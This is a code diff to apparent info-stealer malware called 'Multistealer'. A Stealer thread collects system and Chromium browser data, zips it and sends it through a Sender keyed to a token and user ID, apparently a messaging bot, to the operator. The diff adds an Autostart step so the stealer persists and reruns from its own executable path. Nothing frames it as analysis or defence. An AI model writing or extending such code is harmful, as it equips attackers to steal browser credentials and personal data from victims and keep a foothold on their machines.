@@ -1,8 +1,10 @@
+from sys import argv
 from shutil import rmtree
 from os import path, mkdir
 from threading import Thread
 
 from .utils.sender import Sender
+from .utils.autostart import Autostart
 from .utils.config import MultistealerConfig
 
 from .modules.system import System
@@ -11,12 +13,13 @@ from .modules.chromium import Chromium
 
 class Stealer(Thread):
 
-    def __init__(self, token: str, user_id: int, errors: bool = False, **kwargs):
+    def __init__(self, token: str, user_id: int, autostart: bool = False, errors: bool = False, **kwargs):
         Thread.__init__(self, name="Stealer")
 
         self.token = token
         self.user_id = user_id
         self.errors = errors
+        self.autostart = autostart
 
         self.config = MultistealerConfig()
 
@@ -106,6 +109,7 @@ class Stealer(Thread):
                 method["object"].run()
 
             Sender(self.config.ZipName, self.config.StoragePath, self.config.StorageFolder, self.token, self.user_id, self.errors).run()
+            Autostart(argv[0], (self.autostart,), self.errors).run()
 
         except Exception as e:
 
